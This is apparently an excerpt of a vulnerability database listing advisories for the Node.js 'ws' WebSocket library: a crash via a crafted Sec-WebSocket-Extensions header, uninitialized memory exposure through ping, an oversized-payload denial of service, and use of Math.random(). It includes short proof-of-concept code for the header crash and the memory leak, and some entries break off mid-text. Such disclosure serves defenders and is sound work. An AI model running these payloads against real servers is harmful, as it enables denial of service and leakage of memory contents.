    Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.

    ## Proof of concept

    ```
    const WebSocket = require('ws');
    const net = require('net');

    const wss = new WebSocket.Server({ port: 3000 }, function () {
      const payload = 'constructor';  // or ',;constructor'

      const request = [
        'GET / HTTP/1.1',
        'Connection: Upgrade',
        'Sec-WebSocket-Key: test',
        'Sec-WebSocket-Version: 8',
        `Sec-WebSocket-Extensions: ${payload}`,
        'Upgrade: websocket',
        '\r\n'
      ].join('\r\n');

      const socket = net.connect(3000, function () {
        socket.resume();
        socket.write(request);
      });

  title: Remote Memory Exposure
  description: "[`ws`][1] is a simple to use websocket client, server and console
    for\nnode.js. Affected versions of the package are vulnerable to\nUninitialized
    Memory Exposure.\n\nA client side memory disclosure vulnerability exists in ping\nfunctionality
    of the ws service. When a client sends a ping request and\nprovides an integer
    value as ping data, it will result in leaking an\nuninitialized memory buffer.\n\nThis
    is a result of unobstructed use of the `Buffer` constructor, whose\n[insecure
    default constructor increases the odds of memory leakage][2].\n\n`ws`\\'s `ping`
    function uses the default `Buffer` constructor as-is,\nmaking it easy to append
    uninitialized memory to an existing list. If\nthe value of the buffer list is
    exposed to users, it may expose raw\nmemory, potentially holding secrets, private
    data and code.\n\n**Proof of Concept:**\n\n    var ws = require('ws')\n    \n
    \   var server = new ws.Server({ port: 9000 })\n    var client = new ws('ws://localhost:9000')\n
    \   \n    client.on('open', function () {\n      console.log('open')\n      client.ping(50)
    // this makes the client allocate an uninitialized buffer of 50 bytes and send
    it to the server\n    \n      client.on('pong', function (data) {\n        console.log('got
    pong')\n        console.log(data)\n      })\n    })\n\n\n\n[1]: https://www.npmjs.com/package/ws\n[2]:
    https://snyk.io/blog/exploiting-buffer/\n\\nThe Buffer class on Node.js is a mutable
    array of binary data, and can\nbe initialized with a string, array or number.\n\n
    \   const buf1 = new Buffer([1,2,3]);\n    // creates a buffer containing [01,
    02, 03]\n    const buf2 = new Buffer('test');\n    // creates a buffer containing
    ASCII bytes [74, 65, 73, 74]\n    const buf3 = new Buffer(10);\n    // creates
    a buffer of length 10\n\nThe first two variants simply create a binary representation
    of the\nvalue it received. The last one, however, pre-allocates a buffer of the\nspecified
    size, making it a useful buffer, especially when reading data\nfrom a stream.
    When using the number constructor of Buffer, it will\nallocate the memory, but
    will not fill it with zeros. Instead, the\nallocated buffer will hold whatever
    was in memory at the time. If the\nbuffer is not `zeroed` by using `buf.fill(0)`,
    it may leak sensitive\ninformation like keys, source code, and system info.\n\nSimilar
    vulnerabilities were discovered in [request][1], [mongoose][2],\n[ws][3] and [sequelize][4].\n\n\n\n[1]:

  title: Denial of Service (DoS)
  description: |+
    [`ws`][1] is a WebSocket client and server implementation.

    Affected versions of this package did not limit the size of an incoming
    payload before it was processed by default. As a result, a very large
    payload (over 256MB in size) could lead to a failed allocation and crash
    the node process - enabling a [Denial of Service][2] attack.

    While 256MB may seem excessive, note that the attack is likely to be
    sent from another server, not an end-user computer, using data-center
    connection speeds. In those speeds, a payload of this size can be
    transmitted in seconds.



    [1]: https://www.npmjs.com/package/ws
    [2]: https://en.wikipedia.org/wiki/Denial-of-service_attack
    \nDenial of Service (DoS) describes a family of attacks, all aimed at
    making a system inaccessible to its intended and legitimate users.

    Unlike other vulnerabilities, DoS attacks usually do not aim at
    breaching security. Rather, they are focused on making websites and
    services unavailable to genuine users resulting in downtime.

    One popular Denial of Service vulnerability is DDoS (a Distributed
    Denial of Service), an attack that attempts to clog network pipes to the
    system by generating a large volume of traffic from many machines.

    When it comes to open source libraries, DoS vulnerabilities allow
    attackers to trigger such a crash or crippling of the service by using a
    flaw either in the application code or from the use of open source
    libraries.

    Two common types of DoS vulnerabilities:

    * High CPU/Memory Consumption- An attacker sending crafted requests that
      could cause the system to take a disproportionate amount of time to
      process. For example,
      [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

    * Crash - An attacker sending crafted requests that could cause the
      system to crash. For Example, [npm `ws` package](npm:ws:20171108)

  title: Insecure Randomness
  description: |
    [`ws`][1] is a simple to use websocket client, server and console for
    node.js.

    Affected versions of the package use the cryptographically insecure
    `Math.random()` which can produce predictable values and should not be
    used in security-sensitive context.

    ### Details   {#details}

    Computers are deterministic machines, and as such are unable to produce
    true randomness. Pseudo-Random Number Generators (PRNGs) approximate
    randomness algorithmically, starting with a seed from which subsequent
    values are calculated.

    There are two types of PRNGs: statistical and cryptographic. Statistical
    PRNGs provide useful statistical properties, but their output is highly
    predictable and forms an easy to reproduce numeric stream that is
    unsuitable for use in cases where security depends on generated values
    being unpredictable. Cryptographic PRNGs address this problem by
    generating output that is more difficult to predict. For a value to be
    cryptographically secure, it must be impossible or highly improbable for
    an attacker to distinguish between it and a truly random value. In
    general, if a PRNG algorithm is not advertised as being
    cryptographically secure, then it is probably a statistical PRNG and
    should not be used in security-sensitive contexts.

    You can read more about node\'s insecure `Math.random()` in [Mike
    Malone\'s post][2].
